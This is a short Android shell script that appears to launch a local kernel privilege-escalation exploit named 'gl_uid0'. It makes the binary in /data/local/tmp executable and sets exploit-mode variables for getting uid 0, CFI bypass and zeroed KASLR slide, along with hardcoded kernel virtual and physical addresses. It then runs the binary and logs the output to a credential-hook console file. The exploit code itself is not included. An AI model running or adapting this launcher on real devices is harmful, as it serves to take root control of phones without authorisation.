#!/system/bin/sh
chmod 755 /data/local/tmp/gl_uid0
export MODE4_ONLY=1
export MODE4_SLIDE_ZERO=1
export MODE4_NULL_STORE=1
export MODE4_SWAP_NOCFI=1
export MODE4_UID0=1
export UID0_COMM_CANARY=1
export SLIDE_P0_TARGET=0xffffff802a950700
export DATAONLY_TARGET=0x2950700
export KPHYS=0xa8000000
export CORE_SEL=7
cd /data/local/tmp
rm -f /data/local/tmp/hookcred_console.txt
exec /data/local/tmp/gl_uid0 > /data/local/tmp/hookcred_console.txt 2>&1
